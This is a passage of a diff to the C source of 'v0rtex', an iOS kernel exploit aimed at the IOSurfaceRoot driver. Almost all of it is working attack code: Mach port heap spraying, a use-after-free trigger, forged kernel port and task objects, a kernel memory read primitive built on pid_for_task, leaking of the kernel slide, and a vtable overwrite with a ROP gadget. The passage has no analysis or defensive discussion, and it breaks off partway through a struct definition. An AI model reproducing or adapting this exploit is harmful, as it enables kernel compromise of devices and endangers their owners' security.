-    DInP->Head.msgh_local_port = mig_get_reply_port();
-    DInP->Head.msgh_id = 2865;
-    DInP->Head.msgh_reserved = 0;
-    
-    // Set
-    union {
-        SetRequest In;
-        Reply Out;
-    } SMess;
-    
-    SetRequest *SInP = &SMess.In;
-    Reply *SOutP = &SMess.Out;
-    
-    SInP->NDR = NDR_record;
-    SInP->selector = IOSURFACE_SET_VALUE;
-    SInP->scalar_inputCnt = 0;
-    
-    SInP->inband_inputCnt = 0;
-    
-    SInP->ool_input = (mach_vm_address_t)buf;
-    SInP->ool_input_size = len;
-    
-    SInP->inband_outputCnt = sizeof(uint32_t);
-    SInP->scalar_outputCnt = 0;
-    SInP->ool_output = 0;
-    SInP->ool_output_size = 0;
-    
-    SInP->Head.msgh_bits = MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
-    SInP->Head.msgh_remote_port = client;
-    SInP->Head.msgh_local_port = mig_get_reply_port();
-    SInP->Head.msgh_id = 2865;
-    SInP->Head.msgh_reserved = 0;
-    
-    // Deep breath
-    sched_yield();
-    
-    // Fire
-    kern_return_t ret = mach_msg(&DInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(DeleteRequest), (mach_msg_size_t)sizeof(Reply), DInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-    if(ret == KERN_SUCCESS)
-    {
-        ret = DOutP->RetCode;
-    }
-    if(ret != KERN_SUCCESS)
-    {
-        return ret;
-    }
-    ret = mach_msg(&SInP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, sizeof(SetRequest), (mach_msg_size_t)sizeof(Reply), SInP->Head.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-    if(ret == KERN_SUCCESS)
-    {
-        ret = SOutP->RetCode;
-    }
-    return ret;
-}
-
-// ********** ********** ********** data structures ********** ********** **********
 
 #ifdef __LP64__
 typedef struct
@@ -464,9 +1735,7 @@ typedef struct {
     struct {
         kptr_t data;
         uint32_t type;
-#ifdef __LP64__
         uint32_t pad;
-#endif
     } ip_lock; // spinlock
     struct {
         struct {
@@ -481,13 +1750,11 @@ typedef struct {
                 } waitq_queue;
             } waitq;
             kptr_t messages;
-            uint32_t seqno;
-            uint32_t receiver_name;
+            natural_t seqno;
+            natural_t receiver_name;
             uint16_t msgcount;
             uint16_t qlimit;
-#ifdef __LP64__
             uint32_t pad;
-#endif
         } port;
         kptr_t klist;
     } ip_messages;
@@ -497,32 +1764,21 @@ typedef struct {
     kptr_t ip_pdrequest;
     kptr_t ip_requests;
     kptr_t ip_premsg;
-    uint64_t ip_context;
-    uint32_t ip_flags;
-    uint32_t ip_mscount;
-    uint32_t ip_srights;
-    uint32_t ip_sorights;
+    uint64_t  ip_context;
+    natural_t ip_flags;
+    natural_t ip_mscount;
+    natural_t ip_srights;
+    natural_t ip_sorights;
 } kport_t;
-
-typedef struct {
-    union {
-        kptr_t port;
-        uint32_t index;
-    } notify;
-    union {
-        uint32_t name;
-        kptr_t size;
-    } name;
-} kport_request_t;
 
 typedef union
 {
     struct {
         struct {
             kptr_t data;
-            uint32_t reserved : 24,
-            type     :  8;
-            uint32_t pad;
+            uint64_t pad      : 24,
+            type     :  8,
+            reserved : 32;
         } lock; // mutex lock
         uint32_t ref_count;
         uint32_t active;
@@ -534,39 +1790,38 @@ typedef union
         char pad[OFFSET_TASK_ITK_SELF];
         kptr_t itk_self;
     } b;
+    struct {
+        char pad[OFFSET_TASK_BSD_INFO];
+        kptr_t bsd_info;
+    } c;
 } ktask_t;
 
-// ********** ********** ********** exploit ********** ********** **********
-
-kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
+kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide)
 {
+    load_offsets();
     kern_return_t retval = KERN_FAILURE,
-    ret = 0;
+    ret;
     task_t self = mach_task_self();
     host_t host = mach_host_self();
-    
-    io_connect_t client = MACH_PORT_NULL;
-    mach_port_t stuffport = MACH_PORT_NULL;
-    mach_port_t realport = MACH_PORT_NULL;
-    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
-    mach_port_t port = MACH_PORT_NULL;
-    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
-    mach_port_t fakeport = MACH_PORT_NULL;
-    mach_vm_address_t shmem_addr = 0;
-    mach_port_array_t maps = NULL;
     
     io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
     LOG("service: %x", service);
     if(!MACH_PORT_VALID(service))
     {
-        goto out;
+        goto out0;
     }
     
+    io_connect_t client = MACH_PORT_NULL;
     ret = IOServiceOpen(service, self, 0, &client);
     LOG("client: %x, %s", client, mach_error_string(ret));
-    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client))
+    if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out0;
+    }
+    if(!MACH_PORT_VALID(client))
+    {
+        ret = KERN_FAILURE;
+        goto out0;
     }
     
     uint32_t dict_create[] =
@@ -582,7 +1837,7 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
     };
     union
     {
-        char _padding[IOSURFACE_CREATE_OUTSIZE];
+        char _padding[0x3c8]; // XXX 0x6c8 for iOS 11
         struct
         {
             mach_vm_address_t addr1;
@@ -590,125 +1845,125 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
             uint32_t id;
         } data;
     } surface;
-    memset(&surface, 0, sizeof(surface));
     size_t size = sizeof(surface);
     ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict_create, sizeof(dict_create), &surface, &size);
     LOG("newSurface: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out1;
     }
     
-    ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &stuffport);
-    LOG("stuffport: %x, %s", stuffport, mach_error_string(ret));
-    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(stuffport))
-    {
-        goto out;
-    }
-    
-    ret = _kernelrpc_mach_port_insert_right_trap(self, stuffport, stuffport, MACH_MSG_TYPE_MAKE_SEND);
-    LOG("mach_port_insert_right: %s", mach_error_string(ret));
-    if(ret != KERN_SUCCESS)
-    {
-        goto out;
-    }
-    
+    mach_port_t realport = MACH_PORT_NULL;
     ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &realport);
-    LOG("realport: %x, %s", realport, mach_error_string(ret));
-    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(realport))
-    {
-        goto out;
-    }
-    
-    sched_yield();
-    // Clean out full pages already in freelists
-    ret = my_mach_zone_force_gc(host);
     if(ret != KERN_SUCCESS)
     {
-        LOG("mach_zone_force_gc: %s", mach_error_string(ret));
-        goto out;
+        LOG("mach_port_allocate: %s", mach_error_string(ret));
+        goto out1;
+    }
+    if(!MACH_PORT_VALID(realport))
+    {
+        LOG("realport: %x", realport);
+        ret = KERN_FAILURE;
+        goto out1;
     }
     
+#define NUM_BEFORE 0x1000
+    mach_port_t before[NUM_BEFORE] = { MACH_PORT_NULL };
     for(size_t i = 0; i < NUM_BEFORE; ++i)
     {
         ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &before[i]);
         if(ret != KERN_SUCCESS)
         {
             LOG("mach_port_allocate: %s", mach_error_string(ret));
-            goto out;
+            goto out2;
         }
     }
     
+    mach_port_t port = MACH_PORT_NULL;
     ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &port);
     if(ret != KERN_SUCCESS)
     {
         LOG("mach_port_allocate: %s", mach_error_string(ret));
-        goto out;
+        goto out2;
     }
     if(!MACH_PORT_VALID(port))
     {
         LOG("port: %x", port);
-        goto out;
+        ret = KERN_FAILURE;
+        goto out2;
     }
     
+#define NUM_AFTER 0x100
+    mach_port_t after[NUM_AFTER] = { MACH_PORT_NULL };
     for(size_t i = 0; i < NUM_AFTER; ++i)
     {
         ret = _kernelrpc_mach_port_allocate_trap(self, MACH_PORT_RIGHT_RECEIVE, &after[i]);
         if(ret != KERN_SUCCESS)
         {
             LOG("mach_port_allocate: %s", mach_error_string(ret));
-            goto out;
+            goto out3;
         }
     }
     
+    LOG("realport: %x", realport);
     LOG("port: %x", port);
     
     ret = _kernelrpc_mach_port_insert_right_trap(self, port, port, MACH_MSG_TYPE_MAKE_SEND);
     LOG("mach_port_insert_right: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out3;
     }
     
-#pragma pack(4)
-    typedef struct {
-        mach_msg_base_t base;
-        mach_msg_ool_ports_descriptor_t desc[2];
-    } StuffMsg;
-#pragma pack()
-    StuffMsg msg;
-    msg.base.header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);
-    msg.base.header.msgh_remote_port = stuffport;
-    msg.base.header.msgh_local_port = MACH_PORT_NULL;
-    msg.base.header.msgh_id = 1234;
-    msg.base.header.msgh_reserved = 0;
-    msg.base.body.msgh_descriptor_count = 2;
-    msg.desc[0].address = before;
-    msg.desc[0].count = NUM_BEFORE;
-    msg.desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
-    msg.desc[0].deallocate = FALSE;
-    msg.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-    msg.desc[1].address = after;
-    msg.desc[1].count = NUM_AFTER;
-    msg.desc[1].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
-    msg.desc[1].deallocate = FALSE;
-    msg.desc[1].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-    ret = mach_msg(&msg.base.header, MACH_SEND_MSG, (mach_msg_size_t)sizeof(msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-    LOG("mach_msg: %s", mach_error_string(ret));
+    // There seems to be some weird asynchronity with freeing on IOConnectCallAsyncStructMethod,
+    // which sucks. To work around it, I register the port to be freed on my own task (thus increasing refs),
+    // sleep after the connect call and register again, thus releasing the reference synchronously.
+    ret = mach_ports_register(self, &port, 1);
+    LOG("mach_ports_register: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out3;
     }
     
-    for(size_t i = 0; i < NUM_BEFORE; ++i)
+    uint64_t ref;
+    uint64_t in[3] = { 0, 0x666, 0 };
+    IOConnectCallAsyncStructMethod(client, 17, realport, &ref, 1, in, sizeof(in), NULL, NULL);
+    IOConnectCallAsyncStructMethod(client, 17, port, &ref, 1, in, sizeof(in), NULL, NULL);
+    
+    LOG("herp derp");
+    usleep(100000);
+    
+    sched_yield();
+    ret = mach_ports_register(self, &client, 1); // gonna use that later
+    LOG("mach_ports_register: %s", mach_error_string(ret));
+    if(ret != KERN_SUCCESS)
     {
-        RELEASE_PORT(before[i]);
-    }
-    for(size_t i = 0; i < NUM_AFTER; ++i)
-    {
-        RELEASE_PORT(after[i]);
+        goto out3;
     }
     
+    // Prevent cleanup
+    mach_port_t fakeport = port;
+    port = MACH_PORT_NULL;
+    
+    // Heapcraft
+    /*for(size_t i = NUM_AFTER; i > 0; --i)
+     {
+     if(MACH_PORT_VALID(after[i - 1]))
+     {
+     _kernelrpc_mach_port_destroy_trap(self, after[i - 1]);
+     after[i - 1] = MACH_PORT_NULL;
+     }
+     }
+     for(size_t i = NUM_BEFORE; i > 0; --i)
+     {
+     if(MACH_PORT_VALID(before[i - 1]))
+     {
+     _kernelrpc_mach_port_destroy_trap(self, before[i - 1]);
+     before[i - 1] = MACH_PORT_NULL;
+     }
+     }*/
+    
+#define DATA_SIZE 0x1000
     uint32_t dict[DATA_SIZE / sizeof(uint32_t) + 7] =
     {
         // Some header or something
@@ -751,69 +2006,51 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
     };
     for(uintptr_t ptr = (uintptr_t)&dict[5], end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
-        UNALIGNED_COPY(&triple_kport, ptr, sizeof(kport_t));
+        *(volatile kport_t*)ptr = triple_kport;
     }
-    
-    // There seems to be some weird asynchronity with freeing on IOConnectCallAsyncStructMethod,
-    // which sucks. To work around it, I register the port to be freed on my own task (thus increasing refs),
-    // sleep after the connect call and register again, thus releasing the reference synchronously.
-    ret = mach_ports_register(self, &port, 1);
-    LOG("mach_ports_register: %s", mach_error_string(ret));
-    if(ret != KERN_SUCCESS)
-    {
-        goto out;
-    }
-    
-    uint64_t ref = 0;
-    uint64_t in[3] = { 0, 0x666, 0 };
-    IOConnectCallAsyncStructMethod(client, 17, realport, &ref, 1, in, sizeof(in), NULL, NULL);
-    IOConnectCallAsyncStructMethod(client, 17, port, &ref, 1, in, sizeof(in), NULL, NULL);
-    
-    LOG("herp derp");
-    usleep(100000);
     
     sched_yield();
-    ret = mach_ports_register(self, &client, 1); // gonna use that later
-    LOG("mach_ports_register: %s", mach_error_string(ret));
-    if(ret != KERN_SUCCESS)
+    for(size_t i = NUM_AFTER; i > 0; --i)
     {
-        goto out;
+        if(MACH_PORT_VALID(after[i - 1]))
+        {
+            _kernelrpc_mach_port_destroy_trap(self, after[i - 1]);
+            after[i - 1] = MACH_PORT_NULL;
+        }
+    }
+    for(size_t i = NUM_BEFORE; i > 0; --i)
+    {
+        if(MACH_PORT_VALID(before[i - 1]))
+        {
+            _kernelrpc_mach_port_destroy_trap(self, before[i - 1]);
+            before[i - 1] = MACH_PORT_NULL;
+        }
     }
     
-    // Prevent cleanup
-    fakeport = port;
-    port = MACH_PORT_NULL;
-    
-    // Release port with ool port refs
-    RELEASE_PORT(stuffport);
-    
-    sched_yield();
     ret = my_mach_zone_force_gc(host);
     if(ret != KERN_SUCCESS)
     {
         LOG("mach_zone_force_gc: %s", mach_error_string(ret));
-        goto out;
+        goto out3;
     }
     
-    for(uint32_t i = 0; i < NUM_DATA; ++i)
+    for(uint32_t i = 0; i < 0x2000; ++i)
     {
         dict[DATA_SIZE / sizeof(uint32_t) + 6] = transpose(i);
-        kport_t *dptr = (kport_t*)&dict[5];
+        volatile kport_t *dptr = (kport_t*)&dict[5];
         for(size_t j = 0; j < DATA_SIZE / sizeof(kport_t); ++j)
         {
-            *(((volatile uint32_t*)&dptr[j].ip_context) + 1) = 0x10000000 | i;
-#ifdef __LP64__
-            *(volatile uint32_t*)&dptr[j].ip_messages.port.pad = 0x20000000 | i;
-            *(volatile uint32_t*)&dptr[j].ip_lock.pad = 0x30000000 | i;
-#endif
+            dptr[j].ip_context = (dptr[j].ip_context & 0xffffffff) | ((uint64_t)(0x10000000 | i) << 32);
+            dptr[j].ip_messages.port.pad = 0x20000000 | i;
+            dptr[j].ip_lock.pad = 0x30000000 | i;
         }
-        uint32_t dummy = 0;
+        uint32_t dummy;
         size = sizeof(dummy);
         ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
         if(ret != KERN_SUCCESS)
         {
             LOG("setValue(%u): %s", i, mach_error_string(ret));
-            goto out;
+            goto out3;
         }
     }
     
@@ -822,14 +2059,14 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
     LOG("mach_port_get_context: 0x%016llx, %s", ctx, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out3;
     }
     
     uint32_t shift_mask = ctx >> 60;
     if(shift_mask < 1 || shift_mask > 3)
     {
         LOG("Invalid shift mask.");
-        goto out;
+        goto out3;
     }
     uint32_t shift_off = sizeof(kport_t) - (((shift_mask - 1) * 0x1000) % sizeof(kport_t));
     
@@ -864,26 +2101,34 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
         .ip_srights = 99,
     };
     
-    // Note to self: must be `(uintptr_t)&dict[5] + DATA_SIZE` and not `ptr + DATA_SIZE`.
     for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
-        UNALIGNED_COPY(&kport, ptr, sizeof(kport_t));
+        *(volatile kport_t*)ptr = kport;
     }
+    uint32_t dummy;
+    size = sizeof(dummy);
     
-    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
-    LOG("reallocate_buf: %s", mach_error_string(ret));
+    sched_yield();
+    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
+        goto out3;
+    }
+    size = sizeof(dummy);
+    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
+    LOG("setValue(%u): %s", idx, mach_error_string(ret));
+    if(ret != KERN_SUCCESS)
+    {
+        goto out3;
     }
     
-    // Register realport on fakeport
     mach_port_t notify = MACH_PORT_NULL;
     ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, realport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
-    LOG("mach_port_request_notification(realport): %x, %s", notify, mach_error_string(ret));
+    LOG("mach_port_request_notification: %x, %s", notify, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out3;
     }
     
     uint32_t response[4 + (DATA_SIZE / sizeof(uint32_t))] = { 0 };
@@ -892,19 +2137,19 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
     LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out3;
     }
     if(size < DATA_SIZE + 0x10)
     {
         LOG("Response too short.");
-        goto out;
+        goto out3;
     }
     
     uint32_t fakeport_off = -1;
     kptr_t realport_addr = 0;
     for(uintptr_t ptr = (uintptr_t)&response[4] + shift_off, end = (uintptr_t)&response[4] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
     {
-        kptr_t val = UNALIGNED_KPTR_DEREF(&((kport_t*)ptr)->ip_pdrequest);
+        kptr_t val = ((volatile kport_t*)ptr)->ip_pdrequest;
         if(val)
         {
             fakeport_off = ptr - (uintptr_t)&response[4];
@@ -914,76 +2159,54 @@ kern_return_t v0rtex(v0rtex_cb_t callback, void *cb_data)
     }
     if(!realport_addr)
     {
-        LOG("Failed to leak realport address");
-        goto out;
+        LOG("Failed to leak realport pointer");
+        goto out3;
     }
     LOG("realport addr: " ADDR, realport_addr);
-    uintptr_t fakeport_dictbuf = (uintptr_t)&dict[5] + fakeport_off;
     
-    // Register fakeport on itself (and clean ref on realport)
-    notify = MACH_PORT_NULL;
-    ret = mach_port_request_notification(self, fakeport, MACH_NOTIFY_PORT_DESTROYED, 0, fakeport, MACH_MSG_TYPE_MAKE_SEND_ONCE, &notify);
-    LOG("mach_port_request_notification(fakeport): %x, %s", notify, mach_error_string(ret));
+    ktask_t ktask;
+    ktask.a.lock.data = 0x0;
+    ktask.a.lock.type = 0x22;
+    ktask.a.ref_count = 100;
+    ktask.a.active = 1;
+    ktask.b.itk_self = 1;
+    ktask.c.bsd_info = 0;
+    
+    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
+    kport.ip_kobject = (kptr_t)&ktask;
+    
+    for(uintptr_t ptr = (uintptr_t)&dict[5] + shift_off, end = (uintptr_t)&dict[5] + DATA_SIZE; ptr + sizeof(kport_t) <= end; ptr += sizeof(kport_t))
+    {
+        *(volatile kport_t*)ptr = kport;
+    }
+    size = sizeof(dummy);
+    
+    sched_yield();
+    ret = IOConnectCallStructMethod(client, 11, request, sizeof(request), &dummy, &size);
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        LOG("deleteValue(%u): %s", idx, mach_error_string(ret));
+        goto out3;
     }
-    
-    size = sizeof(response);
-    ret = IOConnectCallStructMethod(client, IOSURFACE_GET_VALUE, request, sizeof(request), response, &size);
-    LOG("getValue(%u): 0x%lx bytes, %s", idx, size, mach_error_string(ret));
+    size = sizeof(dummy);
+    ret = IOConnectCallStructMethod(client, IOSURFACE_SET_VALUE, dict, sizeof(dict), &dummy, &size);
+    LOG("setValue(%u): %s", idx, mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
-    }
-    if(size < DATA_SIZE + 0x10)
-    {
-        LOG("Response too short.");
-        goto out;
-    }
-    kptr_t fakeport_addr = UNALIGNED_KPTR_DEREF(&((kport_t*)((uintptr_t)&response[4] + fakeport_off))->ip_pdrequest);
-    if(!realport_addr)
-    {
-        LOG("Failed to leak fakeport address");
-        goto out;
-    }
-    LOG("fakeport addr: " ADDR, fakeport_addr);
-    kptr_t fake_addr = fakeport_addr - fakeport_off;
-    
-    kport_request_t kreq =
-    {
-        .notify =
-        {
-            .port = 0,
-        }
-    };
-    kport.ip_requests = fakeport_addr + ((uintptr_t)&kport.ip_context - (uintptr_t)&kport) - ((uintptr_t)&kreq.name.size - (uintptr_t)&kreq);
-    UNALIGNED_COPY(&kport, fakeport_dictbuf, sizeof(kport));
-    
-    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
-    LOG("reallocate_buf: %s", mach_error_string(ret));
-    if(ret != KERN_SUCCESS)
-    {
-        goto out;
+        goto out3;
     }
     
-#define KREAD(addr, buf, len) \
+#define KREAD(addr, buf, size) \
 do \
 { \
-for(size_t i = 0; i < ((len) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
+for(size_t i = 0; i < ((size) + sizeof(uint32_t) - 1) / sizeof(uint32_t); ++i) \
 { \
-ret = my_mach_port_set_context(self, fakeport, (addr) + i * sizeof(uint32_t)); \
+ktask.c.bsd_info = (addr + i * sizeof(uint32_t)) - OFFSET_PROC_P_PID; \
+ret = pid_for_task(fakeport, (int*)((uint32_t*)(buf) + i)); \
 if(ret != KERN_SUCCESS) \
 { \
-LOG("mach_port_set_context: %s", mach_error_string(ret)); \
-goto out; \
-} \
-mach_msg_type_number_t outsz = 1; \
-ret = mach_port_get_attributes(self, fakeport, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)((uint32_t*)(buf) + i), &outsz); \
-if(ret != KERN_SUCCESS) \
-{ \
-LOG("mach_port_get_attributes: %s", mach_error_string(ret)); \
-goto out; \
+LOG("pid_for_task: %s", mach_error_string(ret)); \
+goto out3; \
 } \
 } \
 } while(0)
@@ -991,330 +2214,169 @@ goto out; \
     kptr_t itk_space = 0;
     KREAD(realport_addr + ((uintptr_t)&kport.ip_receiver - (uintptr_t)&kport), &itk_space, sizeof(itk_space));
     LOG("itk_space: " ADDR, itk_space);
-    if(!itk_space)
-    {
-        goto out;
-    }
     
     kptr_t self_task = 0;
     KREAD(itk_space + OFFSET_IPC_SPACE_IS_TASK, &self_task, sizeof(self_task));
     LOG("self_task: " ADDR, self_task);
-    if(!self_task)
-    {
-        goto out;
-    }
     
     kptr_t IOSurfaceRootUserClient_port = 0;
     KREAD(self_task + OFFSET_TASK_ITK_REGISTERED, &IOSurfaceRootUserClient_port, sizeof(IOSurfaceRootUserClient_port));
     LOG("IOSurfaceRootUserClient port: " ADDR, IOSurfaceRootUserClient_port);
-    if(!IOSurfaceRootUserClient_port)
-    {
-        goto out;
-    }
     
     kptr_t IOSurfaceRootUserClient_addr = 0;
     KREAD(IOSurfaceRootUserClient_port + ((uintptr_t)&kport.ip_kobject - (uintptr_t)&kport), &IOSurfaceRootUserClient_addr, sizeof(IOSurfaceRootUserClient_addr));
     LOG("IOSurfaceRootUserClient addr: " ADDR, IOSurfaceRootUserClient_addr);
-    if(!IOSurfaceRootUserClient_addr)
-    {
-        goto out;
-    }
     
     kptr_t IOSurfaceRootUserClient_vtab = 0;
     KREAD(IOSurfaceRootUserClient_addr, &IOSurfaceRootUserClient_vtab, sizeof(IOSurfaceRootUserClient_vtab));
     LOG("IOSurfaceRootUserClient vtab: " ADDR, IOSurfaceRootUserClient_vtab);
-    if(!IOSurfaceRootUserClient_vtab)
-    {
-        goto out;
-    }
     
-    // Unregister IOSurfaceRootUserClient port
+    kptr_t slide = IOSurfaceRootUserClient_vtab - OFFSET_IOSURFACEROOTUSERCLIENT_VTAB;
+    LOG("slide: " ADDR, slide);
+    if((slide % 0x100000) != 0)
+    {
+        goto out3;
+    }
+#define OFF(name) (OFFSET_ ## name + slide)
+    
     ret = mach_ports_register(self, NULL, 0);
     LOG("mach_ports_register: %s", mach_error_string(ret));
     if(ret != KERN_SUCCESS)
     {
-        goto out;
+        goto out3;
     }
     
-    kptr_t vtab[VTAB_SIZE] = { 0 };
+    kptr_t vtab[0x600 / sizeof(kptr_t)] = { 0 };
     KREAD(IOSurfaceRootUserClient_vtab, vtab, sizeof(vtab));
-    
-    kptr_t kbase = (vtab[OFFSET_VTAB_GET_RETAIN_COUNT] & ~(KERNEL_SLIDE_STEP - 1)) + KERNEL_HEADER_OFFSET;
-    for(uint32_t magic = 0; 1; kbase -= KERNEL_SLIDE_STEP)
-    {
-        KREAD(kbase, &magic, sizeof(magic));
-        if(magic == KERNEL_MAGIC)
-        {
-            break;
-        }
-    }
-    LOG("Kernel base: " ADDR, kbase);
-    
-#ifndef XXX
-    kptr_t slide = kbase - 0xfffffff007004000;
-    LOG("Kernel slide: " ADDR, slide);
-    if((slide % 0x100000) != 0)
-    {
-        goto out;
-    }
-#endif
-    
-    mach_hdr_t khdr = { 0 };
-    KREAD(kbase, &khdr, sizeof(khdr));
-    
-#define OFF(name) (OFFSET_ ## name + slide)
-    
-    kptr_t zone_map_addr = 0;
-    KREAD(OFF(ZONE_MAP), &zone_map_addr, sizeof(zone_map_addr));
-    LOG("zone_map: " ADDR, zone_map_addr);
-    if(!zone_map_addr)
-    {
-        goto out;
-    }
-    
-    vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX] = OFF(ROP_LDR_X0_X0_0x10);
-    
-    uint32_t faketask_off = fakeport_off < sizeof(ktask_t) ? fakeport_off + sizeof(kport_t) : 0;
-    faketask_off = UINT64_ALIGN(faketask_off);
-    uintptr_t faketask_buf = (uintptr_t)&dict[5] + faketask_off;
-    
-    ktask_t ktask;
-    memset(&ktask, 0, sizeof(ktask));
-    ktask.a.lock.data = 0x0;
-    ktask.a.lock.type = 0x22;
-    ktask.a.ref_count = 100;
-    ktask.a.active = 1;
-    ktask.a.map = zone_map_addr;
-    ktask.b.itk_self = 1;
-    UNALIGNED_COPY(&ktask, faketask_buf, sizeof(ktask));
-    
-    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
-    kport.ip_kobject = fake_addr + faketask_off;
-    kport.ip_requests = 0;
-    kport.ip_context = 0;
-    UNALIGNED_COPY(&kport, fakeport_dictbuf, sizeof(kport));
-    
-#undef KREAD
-    ret = reallocate_buf(client, surface.data.id, idx, dict, sizeof(dict));
-    LOG("reallocate_buf: %s", mach_error_string(ret));
-    if(ret != KERN_SUCCESS)
-    {
-        goto out;
-    }
-    
-    vm_prot_t cur = 0,
-    max = 0;
-    sched_yield();
-    ret = mach_vm_remap(self, &shmem_addr, DATA_SIZE, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, fakeport, fake_addr, false, &cur, &max, VM_INHERIT_NONE);
-    if(ret != KERN_SUCCESS)
-    {
-        LOG("mach_vm_remap: %s", mach_error_string(ret));
-        goto out;
-    }
-    *(uint32_t*)shmem_addr = 123; // fault page
-    LOG("shmem_addr: 0x%016llx", shmem_addr);
-    volatile kport_t *fakeport_buf = (volatile kport_t*)(shmem_addr + fakeport_off);
-    
-    uint32_t vtab_off = fakeport_off < sizeof(vtab) ? fakeport_off + sizeof(kport_t) : 0;
-    vtab_off = UINT64_ALIGN(vtab_off);
-    kptr_t vtab_addr = fake_addr + vtab_off;
-    LOG("vtab addr: " ADDR, vtab_addr);
-    volatile kptr_t *vtab_buf = (volatile kptr_t*)(shmem_addr + vtab_off);
-    for(volatile kptr_t *src = vtab, *dst = vtab_buf, *end = src + VTAB_SIZE; src < end; *(dst++) = *(src++));
-    
-#define MAXRANGES 5
-    struct
-    {
-        uint32_t start;
-        uint32_t end;
-    } ranges[MAXRANGES] =
-    {
-        { fakeport_off, (uint32_t)(fakeport_off + sizeof(kport_t)) },
-        { vtab_off, (uint32_t)(vtab_off + sizeof(vtab)) },
-    };
-    size_t numranges = 2;
-#define FIND_RANGE(var, size) \
-do \
-{ \
-if(numranges >= MAXRANGES) \
-{ \
-LOG("FIND_RANGE(" #var "): ranges array too small"); \
-goto out; \
-} \
-for(int32_t i = 0; i < numranges; ++i) \
-{ \
-uint32_t end = var + (uint32_t)(size); \
-if( \
-(var >= ranges[i].start && var < ranges[i].end) || \
-(end >= ranges[i].start && var < ranges[i].end) \
-) \
-{ \
-var = UINT64_ALIGN(ranges[i].end); \
-i = -1; \
-} \
-} \
-if(var + (uint32_t)(size) > DATA_SIZE) \
-{ \
-LOG("FIND_RANGE(" #var ") out of range: 0x%x-0x%x", var, var + (uint32_t)(size)); \
-goto out; \
-} \
-ranges[numranges].start = var; \
-ranges[numranges].end = var + (uint32_t)(size); \
-++numranges; \
-} while(0)
-    
-    typedef union
+    vtab[OFFSET_VTAB_GET_EXTERNAL_TRAP_FOR_INDEX / sizeof(kptr_t)] = OFF(ROP_ADD_X0_X0_0x10);
+    union
     {
         struct {
             // IOUserClient fields
             kptr_t vtab;
             uint32_t refs;
             uint32_t pad;
-            // Gadget stuff
